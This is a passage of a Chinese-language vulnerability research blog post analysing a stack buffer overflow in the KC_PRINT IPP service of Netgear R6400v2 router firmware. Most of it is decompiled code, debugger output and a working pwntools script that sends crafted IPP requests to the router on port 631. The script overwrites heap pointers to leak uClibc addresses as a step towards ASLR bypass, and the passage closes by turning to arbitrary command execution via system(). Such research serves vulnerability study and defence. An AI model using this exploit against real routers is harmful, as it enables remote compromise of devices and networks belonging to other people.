class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br></pre></td><td class="code"><pre><span class="line">flag1 = <span class="number">0</span>;</span><br><span class="line"> prefix_size = <span class="number">0x4A</span>;</span><br><span class="line"> prefix_ptr = <span class="built_in">malloc</span>(<span class="number">0x4A</span>u);</span><br><span class="line"> <span class="keyword">if</span> ( !prefix_ptr )</span><br><span class="line"> &#123;</span><br><span class="line">   perror(<span class="string">&quot;Response_Get_Jobs: malloc xx&quot;</span>);</span><br><span class="line">   <span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line"> &#125;</span><br><span class="line"> <span class="built_in">memset</span>(prefix_ptr, <span class="number">0</span>, prefix_size);</span><br><span class="line"> cnt = memcpy_n(prefix_ptr, total, &amp;recv_buf[offset], <span class="number">2u</span>);</span><br><span class="line"> total += cnt;</span><br><span class="line"> <span class="keyword">if</span> ( *recv_buf == <span class="number">1</span> &amp;&amp; !recv_buf[<span class="number">1</span>] )</span><br><span class="line">   flag1 = <span class="number">1</span>;</span><br><span class="line"> offset += <span class="number">2</span>;</span><br><span class="line"> *(prefix_ptr + total++) = <span class="number">0</span>;</span><br><span class="line"> *(prefix_ptr + total++) = <span class="number">0</span>;</span><br><span class="line"> offset += <span class="number">2</span>;</span><br><span class="line"> total += memcpy_n(prefix_ptr, total, &amp;recv_buf[offset], <span class="number">4u</span>);</span><br><span class="line"> offset += <span class="number">4</span>;</span><br><span class="line"> v12 = <span class="number">66</span>;</span><br><span class="line"> cnt = memcpy_n(prefix_ptr, total, &amp;unk_1823C, <span class="number">0x42</span>u);</span><br><span class="line"> total += cnt;</span><br><span class="line"> ++offset;                                     <span class="comment">// offest == 09</span></span><br><span class="line"> <span class="built_in">memset</span>(v9, <span class="number">0</span>, <span class="keyword">sizeof</span>(v9));</span><br><span class="line"> <span class="built_in">memset</span>(buf_2048, <span class="number">0</span>, <span class="keyword">sizeof</span>(buf_2048));</span><br><span class="line"> buf_2048[subffix_offset++] = <span class="number">5</span>;</span><br><span class="line"> <span class="keyword">if</span> ( !flag1 )</span><br><span class="line"> &#123;</span><br><span class="line">   <span class="keyword">while</span> ( recv_buf[offset] != <span class="number">3</span> &amp;&amp; offset &lt;= content_len )</span><br><span class="line">   &#123;</span><br><span class="line">     <span class="keyword">if</span> ( recv_buf[offset] == <span class="number">0x44</span> &amp;&amp; !flag2 )</span><br><span class="line">     &#123;</span><br><span class="line">       flag2 = <span class="number">1</span>;</span><br><span class="line">       buf_2048[subffix_offset++] = <span class="number">68</span>;</span><br><span class="line">       copy_len = (recv_buf[offset + <span class="number">1</span>] &lt;&lt; <span class="number">8</span>) + recv_buf[offset + <span class="number">2</span>];</span><br><span class="line">       cnt = memcpy_n(buf_2048, subffix_offset, &amp;recv_buf[offset + <span class="number">1</span>], copy_len + <span class="number">2</span>);</span><br><span class="line">       subffix_offset += cnt;</span><br><span class="line">     &#125;</span><br><span class="line">     ++offset;                                 <span class="comment">// offset=10</span></span><br><span class="line">     copy_len = (recv_buf[offset] &lt;&lt; <span class="number">8</span>) + recv_buf[offset + <span class="number">1</span>];</span><br><span class="line">     offset += <span class="number">2</span> + copy_len;                   <span class="comment">// offset 12</span></span><br><span class="line">     copy_len = (recv_buf[offset] &lt;&lt; <span class="number">8</span>) + recv_buf[offset + <span class="number">1</span>];</span><br><span class="line">     offset += <span class="number">2</span>;                              <span class="comment">// offset 14</span></span><br><span class="line">     <span class="keyword">if</span> ( flag2 )</span><br><span class="line">     &#123;</span><br><span class="line">       <span class="built_in">memset</span>(command, <span class="number">0</span>, <span class="keyword">sizeof</span>(command));</span><br><span class="line">       <span class="built_in">memcpy</span>(command, &amp;recv_buf[offset], copy_len);</span><br><span class="line">       <span class="keyword">if</span> ( !<span class="built_in">strcmp</span>(command, <span class="string">&quot;job-media-sheets-completed&quot;</span>) )</span><br></pre></td></tr></table></figure>
<p>存在一个缓冲区溢出：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> ( flag2 )</span><br><span class="line">&#123;</span><br><span class="line">  <span class="built_in">memset</span>(command, <span class="number">0</span>, <span class="keyword">sizeof</span>(command));</span><br><span class="line">  <span class="built_in">memcpy</span>(command, &amp;recv_buf[offset], copy_len);</span><br></pre></td></tr></table></figure>

<p>此处的 <code>copy_len</code>  是完全可控的， 且 <code>buf_2048</code>   在栈上， 我们只需让 <code>flag1</code>  不等于1 ， <code>flag2</code> 等于 1 ，就能进入到这个分支， 即满足  <code> *recv_buf == 1 &amp;&amp; !recv_buf[1]</code> 且 <code> recv_buf[offset] == 0x44</code> 条件即可。</p>
<h2 id="利用编写"><a href="#利用编写" class="headerlink" title="利用编写"></a>利用编写</h2><p>该程序保护都没有开启</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; checksec</span><br><span class="line">[*] <span class="string">&#x27;/workhub/Dropbox/Attachments/IoT and BaseBand/Router/Netgear/R6400v2/fs/squashfs-root/usr/bin/KC_PRINT&#x27;</span></span><br><span class="line">    Arch:     arm-32-little</span><br><span class="line">    RELRO:    No RELRO</span><br><span class="line">    Stack:    No canary found</span><br><span class="line">    NX:       NX enabled</span><br><span class="line">    PIE:      No PIE (0x8000)</span><br><span class="line"></span><br><span class="line">pwndbg&gt;</span><br></pre></td></tr></table></figure>

<p>既没有 <code>canary</code>  也没有 <code>PIE</code> ， 这极大的方便了我们的漏洞利用。  </p>
<p>系统随机化开启情况：</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># cat /proc/sys/kernel/randomize_va_space</span></span><br><span class="line">1</span><br></pre></td></tr></table></figure>

<p><code>ASLR</code> 等级为 1， 即栈和共享库是完全随机的， 但是堆的分配不随机。</p>
<p>我们的目的是通过这个栈溢出漏洞， 来达到任意命令执行的目的。我们检索这个程序，发现程序里并没有现成的 <code>system</code> 或者 <code>popen</code> 函数，因此 <code>ret2system</code> 的方法并不能直接使用， 因此我们需要绕过随机化，需要泄漏 <code>uclibc</code> 中的 <code>system</code> 地址， 因此首先需要一个信息泄漏的方法，来 leak <code>uclibc </code> 的加载基址。</p>
<h3 id="Bypass-ASLR"><a href="#Bypass-ASLR" class="headerlink" title="Bypass ASLR"></a>Bypass ASLR</h3><p>其实一般这种思路， 我们可以通过 ROP ， 调用 <code>write</code> 等函数读取  <code>got</code> 表中的值来做 <code>uclibc </code>的地址。 但是这个方法我们可能需要知道我们当前链接的 <code>fd</code> 。如果不知道 <code>fd</code> ， 我们可能需要爆破这个， 但由于这个程序是多线程而不是父子进程的形式， 如果失败可能会造成 crash。 </p>
<p>进一步分析函数， 以及阅读 slide  ，我们发现程序中有一个可以做任意地址读写的方法。</p>
<p><a href="https://sw-blog.oss-cn-hongkong.aliyuncs.com/img/2022-09-08-763f460331a41355beb24dcb1b383c47-159298.png" class="gallery-item"><img src="https://sw-blog.oss-cn-hongkong.aliyuncs.com/img/2022-09-08-763f460331a41355beb24dcb1b383c47-159298.png"></a></p>
<p>我们可以通过栈溢出， 来覆盖 <code>prefix_ptr</code>  和 <code>prefix_size </code> 通过控制这两个变量，我们就可以通 <code>write_ipp_response</code>  将我们想读取的内容发送回来。</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">char</span> command[<span class="number">64</span>]; <span class="comment">// [sp+24h] [bp-1090h] BYREF</span></span><br><span class="line"><span class="keyword">char</span> buf_2048[<span class="number">2048</span>]; <span class="comment">// [sp+64h] [bp-1050h] BYREF</span></span><br><span class="line"><span class="keyword">char</span> v9[<span class="number">2048</span>]; <span class="comment">// [sp+864h] [bp-850h] BYREF</span></span><br><span class="line"><span class="keyword">int</span> v10; <span class="comment">// [sp+1064h] [bp-50h]</span></span><br><span class="line"><span class="keyword">size_t</span> copy_len; <span class="comment">// [sp+1068h] [bp-4Ch]</span></span><br><span class="line"><span class="keyword">int</span> v12; <span class="comment">// [sp+106Ch] [bp-48h]</span></span><br><span class="line"><span class="keyword">size_t</span> cnt; <span class="comment">// [sp+1070h] [bp-44h]</span></span><br><span class="line"><span class="keyword">size_t</span> prefix_size; <span class="comment">// [sp+1074h] [bp-40h]</span></span><br><span class="line"><span class="keyword">int</span> total; <span class="comment">// [sp+1078h] [bp-3Ch]</span></span><br><span class="line"><span class="keyword">void</span> *prefix_ptr; <span class="comment">// [sp+107Ch] [bp-38h]</span></span><br><span class="line"><span class="keyword">int</span> v17; <span class="comment">// [sp+1080h] [bp-34h]</span></span><br><span class="line"><span class="keyword">int</span> client_sock; <span class="comment">// [sp+1084h] [bp-30h]</span></span><br><span class="line"><span class="keyword">int</span> v19; <span class="comment">// [sp+1088h] [bp-2Ch]</span></span><br><span class="line"><span class="keyword">int</span> v20; <span class="comment">// [sp+108Ch] [bp-28h]</span></span><br><span class="line"><span class="keyword">char</span> flag1; <span class="comment">// [sp+1093h] [bp-21h]</span></span><br><span class="line"><span class="keyword">char</span> v22; <span class="comment">// [sp+1094h] [bp-20h]</span></span><br><span class="line"><span class="keyword">char</span> job_state_resons; <span class="comment">// [sp+1095h] [bp-1Fh]</span></span><br><span class="line"><span class="keyword">char</span> job_state; <span class="comment">// [sp+1096h] [bp-1Eh]</span></span><br><span class="line"><span class="keyword">char</span> job_originating_user_name; <span class="comment">// [sp+1097h] [bp-1Dh]</span></span><br><span class="line"><span class="keyword">char</span> job_name; <span class="comment">// [sp+1098h] [bp-1Ch]</span></span><br><span class="line"><span class="keyword">char</span> job_id; <span class="comment">// [sp+1099h] [bp-1Bh]</span></span><br><span class="line"><span class="keyword">char</span> v28; <span class="comment">// [sp+109Ah] [bp-1Ah]</span></span><br><span class="line"><span class="keyword">char</span> flag2; <span class="comment">// [sp+109Bh] [bp-19h]</span></span><br><span class="line"><span class="keyword">size_t</span> final_size; <span class="comment">// [sp+109Ch] [bp-18h]</span></span><br><span class="line"><span class="keyword">int</span> offset; <span class="comment">// [sp+10A0h] [bp-14h]</span></span><br><span class="line"><span class="keyword">size_t</span> response_len; <span class="comment">// [sp+10A4h] [bp-10h]</span></span><br><span class="line"><span class="keyword">void</span> *final_ptr; <span class="comment">// [sp+10A8h] [bp-Ch]</span></span><br><span class="line"><span class="keyword">size_t</span> subffix_offset; <span class="comment">// [sp+10ACh] [bp-8h]</span></span><br></pre></td></tr></table></figure>

<p>最首先的想法肯定是通过覆盖 <code>prefix_ptr</code> 指向 <code>.got</code>  来做读写， 但是如果我们直接的指向了函数的 <code>.got</code>  , 例如 <code>strcpy_ptr</code></p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">.got:<span class="number">000180F</span>0 strcpy_ptr      DCD __imp_strcpy        ; DATA XREF: <span class="built_in">strcpy</span>+<span class="number">8</span></span><br></pre></td></tr></table></figure>

<p>但是在调用 <code>write_ipp_response</code> 后， 程序会 <code>free(prefix_ptr);</code></p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">v10 = write_ipp_response(client_sock, final_ptr, response_len);</span><br><span class="line"><span class="keyword">if</span> ( prefix_ptr )</span><br><span class="line">&#123;</span><br><span class="line">  <span class="built_in">free</span>(prefix_ptr);</span><br><span class="line">  prefix_ptr = <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>如果是直接控制  <code>prefix_ptr == 000180F0</code> ， 在 <code>free</code> 的过程中会造成崩溃。 最后我们发现当把 <code>prefix_ptr </code> 指向 <code>.got</code>  的开头</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">.got:<span class="number">000180E4</span>                                         ; sub_8C0C+<span class="number">8</span>↑o ...</span><br><span class="line">.got:<span class="number">000180E8</span>                 DCD <span class="number">0</span></span><br><span class="line">.got:<span class="number">000180</span>EC off_180EC       DCD <span class="number">0</span>                   ; DATA XREF: sub_8C0C+C↑r</span><br><span class="line">.got:<span class="number">000180F</span>0 strcpy_ptr      DCD __imp_strcpy        ; DATA XREF: <span class="built_in">strcpy</span>+<span class="number">8</span>↑r</span><br></pre></td></tr></table></figure>
<p>即将 <code>prefix_ptr</code> 指向  <code>000180E4</code>  是不会崩溃的。</p>
<blockquote>
<p>这里和 小伙伴  @aobo @leomxxj 讨论来下 ， 猜测应该是如果是 free(0x000180EC) ， 当 uclibc 会对  libc 的地址写， 造成 crash<br>如果 free(0x00180E4) </p>
<p>pwndbg&gt; telescope 0x000180E4<br>    00:0000│  0x180e4 —▸ 0x1800c ◂— 0x1<br>    01:0004│  0x180e8 —▸ 0x40024030 ◂— 0x0<br>pwndbg&gt; vmmap 0x1800c<br>LEGEND: STACK | HEAP | CODE | DATA | RWX | RODATA<br> 0x18000    0x19000 rw-p     1000 10000  /usr/bin/KC_PRINT +0xc<br>0x1800c 地址是可读写的</p>
</blockquote>
<p>另外在编写这部分 exploit 的时候， 我们发现处理 <code>recv_buf</code> 消息的时候</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> ( !flag1 )</span><br><span class="line"> &#123;</span><br><span class="line">   <span class="keyword">while</span> ( recv_buf[offset] != <span class="number">3</span> &amp;&amp; offset &lt;= content_len )</span><br><span class="line">   &#123;</span><br><span class="line">     <span class="keyword">if</span> ( recv_buf[offset] == <span class="number">0x44</span> &amp;&amp; !flag2 )</span><br><span class="line">     &#123;</span><br></pre></td></tr></table></figure>

<p>这部分是一个 <code>while</code> 循环，只有当消息为 <code>\x03</code> 的时候， 才会结束循环， 因此我们需要 <code>offset</code>  设置好， </p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">    offset += copy_len;</span><br><span class="line">.text:<span class="number">00010</span>A30                 LDR             R2, [R11,<span class="meta">#offset]</span></span><br><span class="line">.text:<span class="number">00010</span>A34                 LDR             R3, [R11,#copy_len]</span><br><span class="line">.text:<span class="number">00010</span>A38                 ADD             R3, R2, R3</span><br><span class="line">.text:<span class="number">00010</span>A3C                 STR             R3, [R11,#<span class="number">-0x14</span>]</span><br></pre></td></tr></table></figure>

<p>结束循环到 <code>write_ipp_response</code> 函数之前 ，我们还需要过两个地方， 第一个处， 为了方便我们在 <code>command</code>  前设置一个 <code>job-id</code></p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br></pre></td><td class="code"><pre><span class="line">    offset += <span class="number">2</span>;                              <span class="comment">// offset 14</span></span><br><span class="line">    <span class="keyword">if</span> ( flag2 )</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="built_in">memset</span>(command, <span class="number">0</span>, <span class="keyword">sizeof</span>(command));</span><br><span class="line">      <span class="built_in">memcpy</span>(command, &amp;recv_buf[offset], copy_len);</span><br><span class="line">      <span class="keyword">if</span> ( !<span class="built_in">strcmp</span>(command, <span class="string">&quot;job-media-sheets-completed&quot;</span>) )</span><br><span class="line">      &#123;</span><br><span class="line">        v22 = <span class="number">1</span>;</span><br><span class="line">      &#125;</span><br><span class="line">      <span class="keyword">else</span> <span class="keyword">if</span> ( !<span class="built_in">strcmp</span>(command, <span class="string">&quot;job-state-reasons&quot;</span>) )</span><br><span class="line">      &#123;</span><br><span class="line">        job_state_resons = <span class="number">1</span>;</span><br><span class="line">      &#125;</span><br><span class="line">      <span class="keyword">else</span> <span class="keyword">if</span> ( !<span class="built_in">strcmp</span>(command, <span class="string">&quot;job-name&quot;</span>) )</span><br><span class="line">      &#123;</span><br><span class="line">        job_name = <span class="number">1</span>;</span><br><span class="line">      &#125;</span><br><span class="line">      <span class="keyword">else</span> <span class="keyword">if</span> ( !<span class="built_in">strcmp</span>(command, <span class="string">&quot;job-originating-user-name&quot;</span>) )</span><br><span class="line">      &#123;</span><br><span class="line">        job_originating_user_name = <span class="number">1</span>;</span><br><span class="line">      &#125;</span><br><span class="line">      <span class="keyword">else</span> <span class="keyword">if</span> ( !<span class="built_in">strcmp</span>(command, <span class="string">&quot;job-state&quot;</span>) )</span><br><span class="line">      &#123;</span><br><span class="line">        job_state = <span class="number">1</span>;</span><br><span class="line">      &#125;</span><br><span class="line">      <span class="keyword">else</span> <span class="keyword">if</span> ( !<span class="built_in">strcmp</span>(command, <span class="string">&quot;job-id&quot;</span>) )</span><br><span class="line">      &#123;</span><br><span class="line">        job_id = <span class="number">1</span>;</span><br><span class="line">      &#125;</span><br><span class="line">      <span class="keyword">else</span></span><br><span class="line">      &#123;</span><br><span class="line">        <span class="keyword">if</span> ( v28 )</span><br><span class="line">        &#123;</span><br><span class="line">          buf_2048[subffix_offset++] = <span class="number">68</span>;</span><br><span class="line">          buf_2048[subffix_offset++] = <span class="number">0</span>;</span><br><span class="line">          buf_2048[subffix_offset++] = <span class="number">0</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        cnt = memcpy_n(buf_2048, subffix_offset, &amp;recv_buf[offset - <span class="number">2</span>], copy_len + <span class="number">2</span>);</span><br><span class="line">        subffix_offset += cnt;</span><br><span class="line">        v28 = <span class="number">1</span>;</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    offset += copy_len;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line">final_size += prefix_size;</span><br><span class="line"><span class="keyword">if</span> ( flag1 )</span><br><span class="line">  v20 = sub_11D68(v17, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, v9);</span><br><span class="line"><span class="keyword">else</span></span><br><span class="line">  v20 = sub_11D68(v17, job_id, job_name, job_originating_user_name, job_state, job_state_resons, v22, v9);</span><br><span class="line"><span class="keyword">if</span> ( v20 &gt; <span class="number">0</span> )</span><br></pre></td></tr></table></figure>

<p>第二处 <code>final_ptr = malloc(++final_size);</code> </p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line">LABEL_54:</span><br><span class="line">    *(final_ptr + response_len++) = <span class="number">3</span>;</span><br><span class="line">    v10 = write_ipp_response(client_sock, final_ptr, response_len);</span><br><span class="line">    <span class="keyword">if</span> ( prefix_ptr )</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="built_in">free</span>(prefix_ptr);</span><br><span class="line">      prefix_ptr = <span class="number">0</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> ( final_ptr )</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="built_in">free</span>(final_ptr);</span><br><span class="line">      final_ptr = <span class="number">0</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> ( v10 )</span><br><span class="line">      <span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">      <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  final_ptr = <span class="built_in">malloc</span>(++final_size);</span><br><span class="line">  <span class="keyword">if</span> ( final_ptr )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">memset</span>(final_ptr, <span class="number">0</span>, final_size);</span><br><span class="line">    cnt = memcpy_n(final_ptr, response_len, prefix_ptr, prefix_size);</span><br><span class="line">    response_len += cnt;</span><br><span class="line">    <span class="keyword">goto</span> LABEL_54;</span><br><span class="line">  &#125;</span><br></pre></td></tr></table></figure>

<p>我们得让 <code>final_size</code> 的值不能太大，不然分配不出来程序就不会走到 <code>write_ipp_response</code> 里，</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">.text:00010D78 loc_10D78                               ; CODE XREF: Response_Get_Jobs+868↑j</span><br><span class="line">.text:00010D78                 LDR             R3, [R11,#-0x18]</span><br><span class="line">.text:00010D7C                 ADD             R3, R3, #1</span><br><span class="line">.text:00010D80                 STR             R3, [R11,#-0x18]</span><br><span class="line">.text:00010D84                 LDR             R3, [R11,#-0x18]</span><br><span class="line">.text:00010D88                 MOV             R0, R3  ; size</span><br><span class="line">.text:00010D8C                 BL              malloc</span><br></pre></td></tr></table></figure>

<p>即需要设置 <code>[R11, #-0x18]</code> 的值， 这是在栈上的。 最后我 leak 的代码大致如下:</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">leak_uclibc</span>():</span></span><br><span class="line"></span><br><span class="line">    <span class="comment"># recv_buf[2] || recv_buf[3] == 10</span></span><br><span class="line">    recv_buf1  = <span class="string">b&#x27;\x00\x00\x00\x0a\x00\x00\x99\x99&#x27;</span></span><br><span class="line">    recv_buf2  = <span class="string">b&#x27;\x00\x44\x00\x00\x10\x5d&#x27;</span> <span class="comment"># 0x1050 is copy_len -&gt; memcpy(command, &amp;recv_buf[offset], copy_len);</span></span><br><span class="line">    recv_buf2 += <span class="string">b&#x27;job-id\x00\x00&#x27;</span> </span><br><span class="line"></span><br><span class="line">    junkdata = cyclic(<span class="number">0x104c</span> , n=<span class="number">4</span>)</span><br><span class="line">    junkdata = bytearray(junkdata)</span><br><span class="line">    junkdata[<span class="number">1026</span>: <span class="number">1026</span>+ len(cmd)] = cmd</span><br><span class="line">    junkdata[<span class="number">0x103c</span>: <span class="number">0x103c</span> + <span class="number">4</span>] = p32(<span class="number">0x106a</span><span class="number">-0xe</span>) <span class="comment"># finish flag offset</span></span><br><span class="line">    junkdata[<span class="number">0x1048</span>: <span class="number">0x1048</span> + <span class="number">4</span>] = p32(<span class="number">0x20</span>)     <span class="comment"># malloc size  - &gt; final_ptr = malloc(++final_size);</span></span><br><span class="line">    junkdata = bytes(junkdata)</span><br><span class="line"></span><br><span class="line">    recv_buf2 += junkdata</span><br><span class="line">    recv_buf2 += p32(<span class="number">20</span>)       <span class="comment"># overwrite  prrefix_size</span></span><br><span class="line">    recv_buf2 += p32(<span class="number">0x180E4</span>)  <span class="comment"># overwrite  prefix_ptr -&gt; .got start address then free is alive </span></span><br><span class="line">    recv_buf2 += <span class="string">b&#x27;\x03&#x27;</span></span><br><span class="line"></span><br><span class="line">    payload =  <span class="string">b&#x27;POST /USB1_LQ\r\n&#x27;</span></span><br><span class="line">    payload += <span class="string">b&#x27;Content-Length: %b\r\n&#x27;</span> % str(len(recv_buf1 + recv_buf2)).encode(<span class="string">&#x27;latin1&#x27;</span>)</span><br><span class="line">    payload += <span class="string">b&#x27;\r\n&#x27;</span></span><br><span class="line"></span><br><span class="line">    p = remote(<span class="string">&quot;192.168.1.1&quot;</span>, <span class="number">631</span>)</span><br><span class="line">    p.send(payload)</span><br><span class="line">    p.send(recv_buf1)</span><br><span class="line">    p.send(recv_buf2)</span><br><span class="line"></span><br><span class="line">    p.recvuntil(<span class="string">b&#x27;\r\n\r\n&#x27;</span>)</span><br><span class="line">    p.recvn(<span class="number">8</span>)</span><br><span class="line">    _dl_linux_resolve = u32(p.recvn(<span class="number">4</span>)) </span><br><span class="line">    print(<span class="string">&#x27;_dl_linux_resolve : &#123;:#x&#125;&#x27;</span>.format(_dl_linux_resolve))</span><br><span class="line">    ld_uClibc =  _dl_linux_resolve - <span class="number">0x3e70</span></span><br><span class="line">    print(<span class="string">&#x27;ld_uClibc : &#123;:#x&#125;&#x27;</span>.format(ld_uClibc))</span><br><span class="line">    p.recvn(<span class="number">4</span>)</span><br><span class="line">    printf_addr = u32(p.recvn(<span class="number">4</span>))</span><br><span class="line">    print(<span class="string">&#x27;printf : &#123;:#x&#125;&#x27;</span>.format(printf_addr))</span><br><span class="line">    uClibc = printf_addr - <span class="number">0x360e0</span></span><br><span class="line">    print(<span class="string">&#x27;uClibc : &#123;:#x&#125;&#x27;</span>.format(uClibc))</span><br><span class="line"></span><br><span class="line">    <span class="comment"># system = uClibc + +0x90f4 # system offset </span></span><br><span class="line">    <span class="comment"># print(&#x27;system : &#123;:#x&#125;&#x27;.format(system))</span></span><br><span class="line">    </span><br><span class="line">    <span class="keyword">return</span> ld_uClibc, uClibc</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>Leak:</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">$ python3 exp_ncc_netgear_ipp.py</span><br><span class="line">[+] Opening connection to 192.168.1.1 on port 631: Done</span><br><span class="line">_dl_linux_resolve : 0x40021e70</span><br><span class="line">ld_uClibc : 0x4001e000</span><br><span class="line"><span class="built_in">printf</span> : 0x401700e0</span><br><span class="line">uClibc : 0x4013a000</span><br></pre></td></tr></table></figure>

<h3 id="Arbitrary-command-execution"><a href="#Arbitrary-command-execution" class="headerlink" title="Arbitrary command execution"></a>Arbitrary command execution</h3><p>通过泄漏 uclibc 的地址， 然后可以计算 <code>system</code>  的地址。 然后我们就可以进一步做劫持返回地址工作。首先我们需要有个一个地址来存储我们 <code>system</code> 将执行的字符串。 回顾上文， 我们提及到了系统的随机化等级为 <code>1</code> 。</p>
<p>系统随机化开启情况：</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># cat /proc/sys/kernel/randomize_va_space</span></span><br><span class="line">1</span><br></pre></td></tr></table></figure>

<p>因此我们可以在堆上查找是否有可控的内容， 通过 <code>hexdump</code> 查找。</p>
